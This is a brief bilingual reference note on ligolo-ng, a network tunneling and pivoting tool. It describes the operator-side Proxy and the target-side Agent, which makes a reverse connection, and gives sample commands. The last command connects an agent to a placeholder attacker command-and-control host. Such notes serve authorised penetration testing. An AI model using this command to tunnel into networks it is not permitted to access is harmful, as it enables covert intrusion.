---
title: ligolo-ng
---

# ligolo-ng

- [nicocha30/ligolo-ng](https://github.com/nicocha30/ligolo-ng)
  - GPL-3.0, Go
  - An advanced, yet simple, tunneling/pivoting tool that uses a TUN interface.
- **Proxy**（控制端 / 服务端）：运行在操作者的本机。它会创建一个虚拟的 TUN 网卡，并监听特定端口等待 Agent 连接。作为中控台，你可以在 Proxy 上管理路由、建立隧道和端口转发。
- **Agent**（被控端 / 客户端）：运行在目标内网机器上。它主动向 Proxy 发起反向连接（Reverse Connection）。Agent 通常不需要 root/管理员权限，负责将接收到的网络指令在内网中实际执行和转发流量。

```bash
# https://github.com/nicocha30/ligolo-ng/releases

ligolo-ng-agent -h
ligolo-ng-proxy -h

./proxy -autocert # Automatically request LetsEncrypt certificates
./proxy -selfcert # Use self-signed certificates

./agent -connect attacker_c2_server.com:11601
```
